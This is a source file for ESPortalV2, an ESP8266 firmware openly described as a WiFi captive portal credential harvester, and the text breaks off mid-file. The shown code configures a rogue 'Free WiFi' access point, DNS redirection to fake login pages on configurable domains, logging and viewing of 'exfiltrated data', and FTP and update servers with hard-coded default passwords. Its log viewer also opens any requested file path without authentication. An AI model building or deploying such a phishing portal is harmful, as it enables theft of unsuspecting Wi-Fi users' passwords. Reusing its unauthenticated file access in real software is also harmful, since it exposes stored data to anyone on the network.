/*
 * ESPortalV2
 * WiFi Captive Portal Credential Harvester for ESP8266 Devices
 * By Corey Harding of www.Exploit.Agency / www.LegacySecurityGroup.com
 * ESPortal is distributed under the MIT License. The license and copyright notice can not be removed and must be distributed alongside all future copies of the software.
 * MIT License
    
    Copyright (c) [2017] [Corey Harding]
    
    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:
    
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
*/

//We need this stuff
#include "HelpText.h"
#include "License.h"
#include "version.h"
#include "spoof_page.h"
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266httpUpdate.h>
#include <ESP8266HTTPUpdateServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include <ArduinoJson.h> // ArduinoJson library 5.11.0 by Benoit Blanchon https://github.com/bblanchon/ArduinoJson
#include <ESP8266FtpServer.h> // https://github.com/exploitagency/esp8266FTPServer/tree/feature/bbx10_speedup
#include <DNSServer.h>
#include <ESP8266mDNS.h>
//#include <DoubleResetDetector.h> // Double Reset Detector library VERSION: 1.0.0 by Stephen Denne https://github.com/datacute/DoubleResetDetector

//Double Reset Detector
/*
#define DRD_TIMEOUT 5
#define DRD_ADDRESS 0
DoubleResetDetector drd(DRD_TIMEOUT, DRD_ADDRESS);
*/

// Port for web server
ESP8266WebServer server(80);
ESP8266WebServer httpServer(1337);
ESP8266HTTPUpdateServer httpUpdater;
FtpServer ftpSrv;
const byte DNS_PORT = 53;
DNSServer dnsServer;

HTTPClient http;

const char* update_path = "/update";
int accesspointmode;
char ssid[32];
char password[64];
int channel;
int hidden;
char local_IPstr[16];
char gatewaystr[16];
char subnetstr[16];
char update_username[32];
char update_password[64];
char ftp_username[32];
char ftp_password[64];
int ftpenabled;
int esportalenabled;
int singlelog;
char welcome_domain[128];
char welcome_redirect[128];
char site1_domain[128];
char site1_redirect[128];
char site2_domain[128];
char site2_redirect[128];
char site3_domain[128];
char site3_redirect[128];
char site4_domain[128];
char site4_redirect[128];
char site5_domain[128];
char site5_redirect[128];
/*
char site6_domain[128];
char site6_redirect[128];
char site7_domain[128];
char site7_redirect[128];
char site8_domain[128];
char site8_redirect[128];
char site9_domain[128];
char site9_redirect[128];
char site10_domain[128];
char site10_redirect[128];
*/char site_other_redirect[128];

void settingsPage()
{
  if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
  String accesspointmodeyes;
  String accesspointmodeno;
  if (accesspointmode==1){
    accesspointmodeyes=" checked=\"checked\"";
    accesspointmodeno="";
  }
  else {
    accesspointmodeyes="";
    accesspointmodeno=" checked=\"checked\"";
  }
  String ftpenabledyes;
  String ftpenabledno;
  if (ftpenabled==1){
    ftpenabledyes=" checked=\"checked\"";
    ftpenabledno="";
  }
  else {
    ftpenabledyes="";
    ftpenabledno=" checked=\"checked\"";
  }
  String esportalenabledyes;
  String esportalenabledno;
  if (esportalenabled==1){
    esportalenabledyes=" checked=\"checked\"";
    esportalenabledno="";
  }
  else {
    esportalenabledyes="";
    esportalenabledno=" checked=\"checked\"";
  }
  String singlelogyes;
  String singlelogno;
  if (singlelog==1){
    singlelogyes=" checked=\"checked\"";
    singlelogno="";
  }
  else {
    singlelogyes="";
    singlelogno=" checked=\"checked\"";
  }
  String hiddenyes;
  String hiddenno;
  if (hidden==1){
    hiddenyes=" checked=\"checked\"";
    hiddenno="";
  }
  else {
    hiddenyes="";
    hiddenno=" checked=\"checked\"";
  }
  server.send(200, "text/html", 
  String()+
  F(
  "<!DOCTYPE HTML>"
  "<html>"
  "<head>"
  "<meta name = \"viewport\" content = \"width = device-width, initial-scale = 1.0, maximum-scale = 1.0, user-scalable=0\">"
  "<title>ESPortalV2 Settings</title>"
  "<style>"
  "\"body { background-color: #808080; font-family: Arial, Helvetica, Sans-Serif; Color: #000000; }\""
  "</style>"
  "</head>"
  "<body>"
  "<a href=\"/esportal\"><- BACK TO INDEX</a><br><br>"
  "<h1>ESPortal Settings</h1>"
  "<a href=\"/restoredefaults\"><button>Restore Default Configuration</button></a>"
  "<hr>"
  "<FORM action=\"/settings\"  id=\"configuration\" method=\"post\">"
  "<P>"
  "<b>WiFi Configuration:</b><br><br>"
  "<b>Network Type</b><br>"
  )+
  F("Access Point Mode: <INPUT type=\"radio\" name=\"accesspointmode\" value=\"1\"")+accesspointmodeyes+F("><br>"
  "Join Existing Network: <INPUT type=\"radio\" name=\"accesspointmode\" value=\"0\"")+accesspointmodeno+F("><br><br>"
  "<b>Hidden<br></b>"
  "Yes <INPUT type=\"radio\" name=\"hidden\" value=\"1\"")+hiddenyes+F("><br>"
  "No <INPUT type=\"radio\" name=\"hidden\" value=\"0\"")+hiddenno+F("><br><br>"
  "SSID: <input type=\"text\" name=\"ssid\" value=\"")+ssid+F("\" maxlength=\"31\" size=\"31\"><br>"
  "Password: <input type=\"password\" name=\"password\" value=\"")+password+F("\" maxlength=\"64\" size=\"31\"><br>"
  "Channel: <select name=\"channel\" form=\"configuration\"><option value=\"")+channel+"\" selected>"+channel+F("</option><option value=\"1\">1</option><option value=\"2\">2</option><option value=\"3\">3</option><option value=\"4\">4</option><option value=\"5\">5</option><option value=\"6\">6</option><option value=\"7\">7</option><option value=\"8\">8</option><option value=\"9\">9</option><option value=\"10\">10</option><option value=\"11\">11</option><option value=\"12\">12</option><option value=\"13\">13</option><option value=\"14\">14</option></select><br><br>"
  "IP: <input type=\"text\" name=\"local_IPstr\" value=\"")+local_IPstr+F("\" maxlength=\"16\" size=\"31\"><br>"
  "Gateway: <input type=\"text\" name=\"gatewaystr\" value=\"")+gatewaystr+F("\" maxlength=\"16\" size=\"31\"><br>"
  "Subnet: <input type=\"text\" name=\"subnetstr\" value=\"")+subnetstr+F("\" maxlength=\"16\" size=\"31\"><br><br>"
  "<hr>"
  "<b>ESPortal Administration Settings:</b><br><br>"
  "Username: <input type=\"text\" name=\"update_username\" value=\"")+update_username+F("\" maxlength=\"31\" size=\"31\"><br>"
  "Password: <input type=\"password\" name=\"update_password\" value=\"")+update_password+F("\" maxlength=\"64\" size=\"31\"><br><br>"
  "<hr>"
  "<b>FTP Server Settings</b><br>"
  "<small>Changes require a reboot.</small><br>"
  "Enabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"1\"")+ftpenabledyes+F("><br>"
  "Disabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"0\"")+ftpenabledno+F("><br><br>"
  "FTP Username: <input type=\"text\" name=\"ftp_username\" value=\"")+ftp_username+F("\" maxlength=\"31\" size=\"31\"><br>"
  "FTP Password: <input type=\"password\" name=\"ftp_password\" value=\"")+ftp_password+F("\" maxlength=\"64\" size=\"31\"><br><br>"
  "<hr>"
  "<b>ESPortal Credential Harvester Settings</b><br>"
  "<small>Changes require a reboot.</small><br>"
  "<small>Do not leave any line blank or as a duplicate of another.</small><br>"
  "Enabled <INPUT type=\"radio\" name=\"esportalenabled\" value=\"1\"")+esportalenabledyes+F("><br>"
  "Disabled <INPUT type=\"radio\" name=\"esportalenabled\" value=\"0\"")+esportalenabledno+F("><br><br>"
  "Log to:<br>"
  "Single File (/esportal-log.txt) <INPUT type=\"radio\" name=\"singlelog\" value=\"1\"")+singlelogyes+F("><br>"
  "Individual files based on domain name (ex: /fakesite1.com) <INPUT type=\"radio\" name=\"singlelog\" value=\"0\"")+singlelogno+F("><br><br>"
  "Welcome Domain: <input type=\"text\" name=\"welcome_domain\" value=\"")+welcome_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Welcome Page On: <input type=\"text\" name=\"welcome_redirect\" value=\"")+welcome_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Catch All Page On: <input type=\"text\" name=\"site_other_redirect\" value=\"")+site_other_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site1 Domain: <input type=\"text\" name=\"site1_domain\" value=\"")+site1_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site1 Page On: <input type=\"text\" name=\"site1_redirect\" value=\"")+site1_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site2 Domain: <input type=\"text\" name=\"site2_domain\" value=\"")+site2_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site2 Page On: <input type=\"text\" name=\"site2_redirect\" value=\"")+site2_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site3 Domain: <input type=\"text\" name=\"site3_domain\" value=\"")+site3_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site3 Page On: <input type=\"text\" name=\"site3_redirect\" value=\"")+site3_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site4 Domain: <input type=\"text\" name=\"site4_domain\" value=\"")+site4_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site4 Page On: <input type=\"text\" name=\"site4_redirect\" value=\"")+site4_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site5 Domain: <input type=\"text\" name=\"site5_domain\" value=\"")+site5_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site5 Page On: <input type=\"text\" name=\"site5_redirect\" value=\"")+site5_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
/*  "Site6 Domain: <input type=\"text\" name=\"site6_domain\" value=\"")+site6_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site6 Page On: <input type=\"text\" name=\"site6_redirect\" value=\"")+site6_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site7 Domain: <input type=\"text\" name=\"site7_domain\" value=\"")+site7_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site7 Page On: <input type=\"text\" name=\"site7_redirect\" value=\"")+site7_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site8 Domain: <input type=\"text\" name=\"site8_domain\" value=\"")+site8_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site8 Page On: <input type=\"text\" name=\"site8_redirect\" value=\"")+site8_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site9 Domain: <input type=\"text\" name=\"site9_domain\" value=\"")+site9_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site9 Page On: <input type=\"text\" name=\"site9_redirect\" value=\"")+site9_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site10 Domain: <input type=\"text\" name=\"site10_domain\" value=\"")+site10_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site10 Page On: <input type=\"text\" name=\"site10_redirect\" value=\"")+site10_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
*/  "<hr>"
  "<INPUT type=\"radio\" name=\"SETTINGS\" value=\"1\" hidden=\"1\" checked=\"checked\">"
  "<INPUT type=\"submit\" value=\"Apply Settings\">"
  "</FORM>"
  "<br><a href=\"/reboot\"><button>Reboot Device</button></a>"
  "</P>"
  "</body>"
  "</html>"
  )
  );
}

void handleSettings()
{
  if (server.hasArg("SETTINGS")) {
    handleSubmitSettings();
  }
  else {
    settingsPage();
  }
}

void returnFail(String msg)
{
  server.sendHeader("Connection", "close");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(500, "text/plain", msg + "\r\n");
}

void handleSubmitSettings()
{
  String SETTINGSvalue;

  if (!server.hasArg("SETTINGS")) return returnFail("BAD ARGS");
  
  SETTINGSvalue = server.arg("SETTINGS");
  accesspointmode = server.arg("accesspointmode").toInt();
  server.arg("ssid").toCharArray(ssid, 32);
  server.arg("password").toCharArray(password, 64);
  channel = server.arg("channel").toInt();
  hidden = server.arg("hidden").toInt();
  server.arg("local_IPstr").toCharArray(local_IPstr, 16);
  server.arg("gatewaystr").toCharArray(gatewaystr, 16);
  server.arg("subnetstr").toCharArray(subnetstr, 16);
  server.arg("update_username").toCharArray(update_username, 32);
  server.arg("update_password").toCharArray(update_password, 64);
  server.arg("ftp_username").toCharArray(ftp_username, 32);
  server.arg("ftp_password").toCharArray(ftp_password, 64);
  ftpenabled = server.arg("ftpenabled").toInt();
  esportalenabled = server.arg("esportalenabled").toInt();
  singlelog = server.arg("singlelog").toInt();
  server.arg("welcome_domain").toCharArray(welcome_domain,128);
  server.arg("welcome_redirect").toCharArray(welcome_redirect,128);
  server.arg("site1_domain").toCharArray(site1_domain,128);
  server.arg("site1_redirect").toCharArray(site1_redirect,128);
  server.arg("site2_domain").toCharArray(site2_domain,128);
  server.arg("site2_redirect").toCharArray(site2_redirect,128);
  server.arg("site3_domain").toCharArray(site3_domain,128);
  server.arg("site3_redirect").toCharArray(site3_redirect,128);
  server.arg("site4_domain").toCharArray(site4_domain,128);
  server.arg("site4_redirect").toCharArray(site4_redirect,128);
  server.arg("site5_domain").toCharArray(site5_domain,128);
  server.arg("site5_redirect").toCharArray(site5_redirect,128);
/*  server.arg("site6_domain").toCharArray(site6_domain,128);
  server.arg("site6_redirect").toCharArray(site6_redirect,128);
  server.arg("site7_domain").toCharArray(site7_domain,128);
  server.arg("site7_redirect").toCharArray(site7_redirect,128);
  server.arg("site8_domain").toCharArray(site8_domain,128);
  server.arg("site8_redirect").toCharArray(site8_redirect,128);
  server.arg("site9_domain").toCharArray(site9_domain,128);
  server.arg("site9_redirect").toCharArray(site9_redirect,128);
  server.arg("site10_domain").toCharArray(site10_domain,128);
  server.arg("site10_redirect").toCharArray(site10_redirect,128);
*/  server.arg("site_other_redirect").toCharArray(site_other_redirect,128);
  
  if (SETTINGSvalue == "1") {
    saveConfig();
    server.send(200, "text/html", F("<a href=\"/esportal\"><- BACK TO INDEX</a><br><br><a href=\"/reboot\"><button>Reboot Device</button></a><br><br>Settings have been saved.<br>Some setting may require manually rebooting ESPortal before taking effect.<br>If network configuration has changed then connect to the new network to access ESPortal."));
    loadConfig();
  }
  else if (SETTINGSvalue == "0") {
    settingsPage();
  }
  else {
    returnFail("Bad SETTINGS value");
  }
}

bool loadDefaults() {
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["version"] = version;
  json["accesspointmode"] = "1";
  json["ssid"] = "Free WiFi";
  json["password"] = "";
  json["channel"] = "6";
  json["hidden"] = "0";
  json["local_IP"] = "192.168.1.1";
  json["gateway"] = "192.168.1.1";
  json["subnet"] = "255.255.255.0";
  json["update_username"] = "admin";
  json["update_password"] = "hacktheplanet";
  json["ftp_username"] = "ftp-admin";
  json["ftp_password"] = "hacktheplanet";
  json["ftpenabled"] = "1";
  json["esportalenabled"] = "1";
  json["singlelog"] = "1";
  json["welcome_domain"] = "ouraccesspoint.com";
  json["welcome_redirect"] = "/welcome";
  json["site1_domain"] = "fakesite1.com";
  json["site1_redirect"] = "/login";
  json["site2_domain"] = "fakesite2.com";
  json["site2_redirect"] = "/sign-in";
  json["site3_domain"] = "fakesite3.com";
  json["site3_redirect"] = "/authenticate";
  json["site4_domain"] = "fakesite4.com";
  json["site4_redirect"] = "/login";
  json["site5_domain"] = "fakesite5.com";
  json["site5_redirect"] = "/sign-in";
/*  json["site6_domain"] = "fakesite6.com";
  json["site6_redirect"] = "/authenticate";
  json["site7_domain"] = "fakesite7.com";
  json["site7_redirect"] = "/login";
  json["site8_domain"] = "fakesite8.com";
  json["site8_redirect"] = "/sign-in";
  json["site9_domain"] = "fakesite9.com";
  json["site9_redirect"] = "/authenticate";
  json["site10_domain"] = "fakesite10.com";
  json["site10_redirect"] = "/login";
*/  json["site_other_redirect"] = "/user/login";
  File configFile = SPIFFS.open("/esportal.json", "w");
  json.printTo(configFile);
  loadConfig();
}

bool loadConfig() {
  File configFile = SPIFFS.open("/esportal.json", "r");
  if (!configFile) {
    loadDefaults();
  }

  size_t size = configFile.size();

  std::unique_ptr<char[]> buf(new char[size]);
  configFile.readBytes(buf.get(), size);
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.parseObject(buf.get());
  
  if (!json["version"]) {
    loadDefaults();
    ESP.restart();
  }

  //Resets config to factory defaults on an update.
  if (json["version"]!=version) {
    loadDefaults();
    ESP.restart();
  }

  strcpy(ssid, (const char*)json["ssid"]);
  strcpy(password, (const char*)json["password"]);
  channel = json["channel"];
  hidden = json["hidden"];
  accesspointmode = json["accesspointmode"];
  strcpy(local_IPstr, (const char*)json["local_IP"]);
  strcpy(gatewaystr, (const char*)json["gateway"]);
  strcpy(subnetstr, (const char*)json["subnet"]);

  strcpy(update_username, (const char*)json["update_username"]);
  strcpy(update_password, (const char*)json["update_password"]);

  strcpy(ftp_username, (const char*)json["ftp_username"]);
  strcpy(ftp_password, (const char*)json["ftp_password"]);
  ftpenabled = json["ftpenabled"];

  esportalenabled = json["esportalenabled"];
  singlelog = json["singlelog"];
  strcpy(welcome_domain, (const char*)json["welcome_domain"]);
  strcpy(welcome_redirect, (const char*)json["welcome_redirect"]);
  strcpy(site1_domain, (const char*)json["site1_domain"]);
  strcpy(site1_redirect, (const char*)json["site1_redirect"]);
  strcpy(site2_domain, (const char*)json["site2_domain"]);
  strcpy(site2_redirect, (const char*)json["site2_redirect"]);
  strcpy(site3_domain, (const char*)json["site3_domain"]);
  strcpy(site3_redirect, (const char*)json["site3_redirect"]);
  strcpy(site4_domain, (const char*)json["site4_domain"]);
  strcpy(site4_redirect, (const char*)json["site4_redirect"]);
  strcpy(site5_domain, (const char*)json["site5_domain"]);
  strcpy(site5_redirect, (const char*)json["site5_redirect"]);
/*  strcpy(site6_domain, (const char*)json["site6_domain"]);
  strcpy(site6_redirect, (const char*)json["site6_redirect"]);
  strcpy(site7_domain, (const char*)json["site7_domain"]);
  strcpy(site7_redirect, (const char*)json["site7_redirect"]);
  strcpy(site8_domain, (const char*)json["site8_domain"]);
  strcpy(site8_redirect, (const char*)json["site8_redirect"]);
  strcpy(site9_domain, (const char*)json["site9_domain"]);
  strcpy(site9_redirect, (const char*)json["site9_redirect"]);
  strcpy(site10_domain, (const char*)json["site10_domain"]);
  strcpy(site10_redirect, (const char*)json["site10_redirect"]);
*/  strcpy(site_other_redirect, (const char*)json["site_other_redirect"]);
  
  IPAddress local_IP;
  local_IP.fromString(local_IPstr);
  IPAddress gateway;
  gateway.fromString(gatewaystr);
  IPAddress subnet;
  subnet.fromString(subnetstr);

/*
  Serial.println(accesspointmode);
  Serial.println(ssid);
  Serial.println(password);
  Serial.println(channel);
  Serial.println(hidden);
  Serial.println(local_IP);
  Serial.println(gateway);
  Serial.println(subnet);
*/
  WiFi.persistent(false);
  //ESP.eraseConfig();
// Determine if set to Access point mode
  if (accesspointmode == 1) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);

//    Serial.print("Starting Access Point ... ");
//    Serial.println(WiFi.softAP(ssid, password, channel, hidden) ? "Success" : "Failed!");
    WiFi.softAP(ssid, password, channel, hidden);

//    Serial.print("Setting up Network Configuration ... ");
//    Serial.println(WiFi.softAPConfig(local_IP, gateway, subnet) ? "Success" : "Failed!");
    WiFi.softAPConfig(local_IP, gateway, subnet);

//    WiFi.reconnect();

//    Serial.print("IP address = ");
//    Serial.println(WiFi.softAPIP());
  }
// or Join existing network
  else if (accesspointmode != 1) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
//    Serial.print("Setting up Network Configuration ... ");
    WiFi.config(local_IP, gateway, subnet);
//    WiFi.config(local_IP, gateway, subnet);

//    Serial.print("Connecting to network ... ");
//    WiFi.begin(ssid, password);
    WiFi.begin(ssid, password);
    WiFi.reconnect();

//    Serial.print("IP address = ");
//    Serial.println(WiFi.localIP());
  }

  return true;
}

bool saveConfig() {
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["version"] = version;
  json["accesspointmode"] = accesspointmode;
  json["ssid"] = ssid;
  json["password"] = password;
  json["channel"] = channel;
  json["hidden"] = hidden;
  json["local_IP"] = local_IPstr;
  json["gateway"] = gatewaystr;
  json["subnet"] = subnetstr;
  json["update_username"] = update_username;
  json["update_password"] = update_password;
  json["ftp_username"] = ftp_username;
  json["ftp_password"] = ftp_password;
  json["ftpenabled"] = ftpenabled;
  json["esportalenabled"] = esportalenabled;
  json["singlelog"] = singlelog;
  json["welcome_domain"] = welcome_domain;
  json["welcome_redirect"] = welcome_redirect;
  json["site1_domain"] = site1_domain;
  json["site1_redirect"] = site1_redirect;
  json["site2_domain"] = site2_domain;
  json["site2_redirect"] = site2_redirect;
  json["site3_domain"] = site3_domain;
  json["site3_redirect"] = site3_redirect;
  json["site4_domain"] = site4_domain;
  json["site4_redirect"] = site4_redirect;
  json["site5_domain"] = site5_domain;
  json["site5_redirect"] = site5_redirect;
/*  json["site6_domain"] = site6_domain;
  json["site6_redirect"] = site6_redirect;
  json["site7_domain"] = site7_domain;
  json["site7_redirect"] = site7_redirect;
  json["site8_domain"] = site8_domain;
  json["site8_redirect"] = site8_redirect;
  json["site9_domain"] = site9_domain;
  json["site9_redirect"] = site9_redirect;
  json["site10_domain"] = site10_domain;
  json["site10_redirect"] = site10_redirect;
*/  json["site_other_redirect"] = site_other_redirect;

  File configFile = SPIFFS.open("/esportal.json", "w");
  json.printTo(configFile);
  return true;
}

File fsUploadFile;
String webString;

void ListLogs(){
  String directory;
  directory="/";
  FSInfo fs_info;
  SPIFFS.info(fs_info);
  String total;
  total=fs_info.totalBytes;
  String used;
  used=fs_info.usedBytes;
  String freespace;
  freespace=fs_info.totalBytes-fs_info.usedBytes;
  Dir dir = SPIFFS.openDir(directory);
  String FileList = String()+F("<a href=\"/esportal\"><- BACK TO INDEX</a><br><br>File System Info Calculated in Bytes<br><b>Total:</b> ")+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><table border='1'><tr><td><b>Display File Contents</b></td><td><b>Size in Bytes</b></td><td><b>Download File</b></td><td><b>Delete File</b></td></tr>";
  while (dir.next()) {
    String FileName = dir.fileName();
    File f = dir.openFile("r");
    FileList += " ";
    if((!FileName.startsWith("/payloads/"))&&(!FileName.startsWith("/esploit.json"))&&(!FileName.startsWith("/esportal.json"))&&(!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/viewlog?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletelog?payload="+FileName+"\"><button>Delete File</button></td></tr>";
  }
  FileList += "</table>";
  server.send(200, "text/html", FileList);
}

bool RawFile(String rawfile) {
  if (SPIFFS.exists(rawfile)) {
    if(!server.authenticate(update_username, update_password)){
      server.requestAuthentication();}
    File file = SPIFFS.open(rawfile, "r");
    size_t sent = server.streamFile(file, "application/octet-stream");
    file.close();
    return true;
  }
  return false;
}

void ViewLog(){
  webString="";
  String payload;
  String ShowPL;
  payload += server.arg(0);
  File f = SPIFFS.open(payload, "r");
  String webString = f.readString();
  f.close();
  ShowPL = String()+F("<a href=\"/esportal\"><- BACK TO INDEX</a><br><br><a href=\"/logs\">List Exfiltrated Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletelog?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
  webString="";
  server.send(200, "text/html", ShowPL);
}

void setup(void)
{
  pinMode(LED_BUILTIN, OUTPUT); 
  Serial.begin(38400);
  //SPIFFS.format();
  SPIFFS.begin();
  
 //loadDefaults(); //uncomment to restore default settings if double reset fails for some reason
 /*
  if (drd.detectDoubleReset()) {
    Serial.println("Double Reset Detected");
    loadDefaults();
  }
  */
  
  loadConfig();

//Set up Web Pages
  server.on("/esportal",[]() {
    FSInfo fs_info;
    SPIFFS.info(fs_info);
    String total;
    total=fs_info.totalBytes;
    String used;
    used=fs_info.usedBytes;
    String freespace;
    freespace=fs_info.totalBytes-fs_info.usedBytes;
    server.send(200, "text/html", String()+F("<html><body><b>ESPortal v")+version+F("</b> - WiFi Captive Portal Credential Harvester<br><img width='86' height='86' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK0AAACtCAYAAADCr/9DAAAMlUlEQVR4nOydD+yVVf3Hz/VvWprYEDRQc5BzS2C5LJdbZs6BQAmBUFkjV1tNk5htZuKf/pCMyKmF2lrFLNCKQAUDM4otSWFjfUmJWlgtU0RTQQRT0Nv703O+7Ha53+99/pzzfM655/3aPjv9ft57ns9zzovzPc9zz3Oew5rNpiEkJg7RToCQolBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdBymnUAv0mg0jkExzP6fO5rN5m7NfHoNSlsSiHkoinMQExFnmEzS/ji67bN7Uexoia2IBxCPQOjXa0y7J2hw7UF+IN9xKMYjJiEmII6vWOULiNWIVYg16IudFetLAkqbA8h6EoobEZ82/v467Uf8SI6DPnna0zF6Ako7CHZk/TLiSsRRNR32FcRtiPkceTtDaTsAWY80majXIIYopfEi4ibEbeijV5VyCBJK2waElQupexHv087F8ijiYvTTDu1EQoHStgBhx6JYiRipnUsbTyImo682aycSAvxxwQJhL0ax3oQnrCA5rbc5Jg+lNf8T9moUyxFv1s5lECS35TbXpEl+egAJLkfxXe08CnIF+m2RdhJaJC0thP0QijUmvl8G5Z7uePTdWu1ENEhWWgg7GsUGo3dLqypyS+y96L+/aidSN0nOaSHsW012lyBWYQXJfaU9l6RIUlqwFHG6dhIOkHNYqp1E3SQnLUamD6O4SDsPh1xkzykZkprT2uWEj5lsKWEvIUsdz0xlmWNqI+1lpveEFeScLtNOoi6SGWkxysrC7G2IE7Vz8cR2xCj0517tRHyT0kg7x/SusIKc2xztJOogpZFW7meO0s7DM9vQn6O1k/BNEiMthJVbQ70urDDKnmtPk4S0JnumKxV6/lxTkXaidgI10vPn2vNzWvsz53OIw7VzqYl9iKHo113aifjC2+omyCKjuFwUjEPIA4J/lEBj7vF1zAE4z6QjrCDneh7ivjoPiv6W9b5jEPL0x/OIPpNdGDofFb1Ia1dQ3WUOfs5qF/7bF3AeP/Zx3AE4pcZjhUKt54w+nYXiFkT74h152mIW+nuby+M5n9MiyQ+a7F9ZpwcD5aTuwmd+gqhrDeuwmo4TErWcM/rwCMTPTLZfQ6fVZu9HbLZOOMOptEjuWBSLTdu2QB34BOLumsQdXsMxQsP7OaPvZBryc8T0Lh8VFxZbN5zgeqSV55dOzvnZaaYecTnSOsYKuwyRd3WZOOHs2TbX0p5T8PN1iEtpHdIywhZdDlnUjQFxLcu7SnxHxJXG+Bgm7Psd5yNsMdnVbEo846PSFmE/UuLrZdzoiGtpZaXR0BLf8yYu6pvlsr5UscLKRVcZYYXtrnJxPT3oq/Dduua4pCAtwlbZLKSKG/+Ha2nvRLxR4fsUNzAcCStO3OkmI8fS4k/xIygWVqyG4gaCFfanppqwwkLrhhOcrz0ocTtkIKQOXxdnpAstwk6pWNX9iGnox33Vs8pw/ouYTU5uON9fsSqOuEo4Fna6S2EFL0sTkeRrJpOu6qINilsztq3vMdWFlb6fZl1wirf1tC0jLsWNBNvGMsJOrViV9LnzEbYfr4vAKW48tIywQQsreH9yoUXceytWRXE90SLsRytWJX3sVVihlsdt7ElcYihucDgW9hLfwgq1PSNGccPDtuHdJiJhhdqfEXN4O+VlRBJ7V3lE9jZ7S8U6ViBm1CWsoPJgo0NxiS61CyuoPEJuT3KGyV7OQeJE+q52YQW1fQ/syc40FDdGpM9maggrqG7WwRE3StRG2H7Ud5ixC2JE3F9o50K6In00Q3sRk7q0gm0EmSpQ3HCRvpmpLawQhLRCi7jLtHMhByF9EoSwQnB7edkb3nIrped3/4uEVYgpoQgrBDPS9mMbJ8k3EQbK2pCEFYKTlpBuUFoSHVx0Up1/IeYV/M61iBEeckkCSlud5zHnK/R4NC42P2cobWk4PSDRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdFBaEh2l9j1oNBqTUUxAnIUY5jSjjGM81OmLsHbwc8/16O8veqh3B2ITYnWz2VxZ6Juya2LeAENM9gqfJuNA9BVpQ9uOfQHkHVKIU0Pytl/ukRb/2mQqIW+VPjfvdwjJiexLPAKOfQBSvtHtw0XmtFcZCkv8IW5dleeDRaS9slwuhOQml2O5pMWwfYLhhmnEPyOsa4OSd6R9e8VkCMlLV9fySrsVEdQW5qQnEce2dvtQLmlxRfcfk91TI8Qnm6xrg1LkQmy24Vu/iT/Erdl5PphbWvwL2IBibtmMCOnCXOtYVwqtPUCl80328+3TZbIipAPi0gTrVi4Krz1A5WsajcZp+J9jjb+1B2eb7B8H0Wc1YqOHevvXHmyGU68W+WKpBTP2IBuNn5OR+8KfMZQ2FJahv3+onUQroS5NfFk7AXKA3doJtENpSTcobU4obThQ2pxQ2nCgtDnZo50AOQClzQlH2nCgtDl5xnCBTgjIUwS7tJNoJ0hpm83mPhR/186DmCdsXwRFkNJa/qydADF/0k6gEyFL+xftBIjZop1AJ0KWliOtPpS2IJRWH04PCsLpgS5y5yDIgSNYaXHV+m8TaKMlwr